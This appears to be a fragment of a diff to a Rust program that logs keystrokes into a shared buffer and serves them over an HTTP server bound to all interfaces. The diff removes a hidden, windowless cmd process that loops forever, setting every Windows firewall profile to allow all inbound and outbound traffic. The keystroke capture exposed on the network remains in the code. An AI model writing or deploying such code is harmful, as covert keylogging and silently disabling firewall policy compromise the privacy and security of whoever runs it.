@@ -50,13 +50,6 @@ async fn main() {
         *lock3.lock().unwrap() += &(key.to_string() + "&#x2191; ");
     });
 
-    Command::new("cmd")
-        .creation_flags(0x08000000)
-        .arg("/c")
-        .arg("for /l %i in (0,0,0) do @(netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound)")
-        .spawn()
-        .unwrap();
-
     spawn(async {
         let lckin = lck2;
         loop {
@@ -75,7 +68,7 @@ async fn main() {
     });
 
     axum::serve(
-        TcpListener::bind(String::from("0.0.0.0:") + &arg.next().unwrap_or(String::from("1145")))
+        TcpListener::bind(String::from("0.0.0.0:") + &arg.next().unwrap())
             .await
             .unwrap(),
         Router::new()
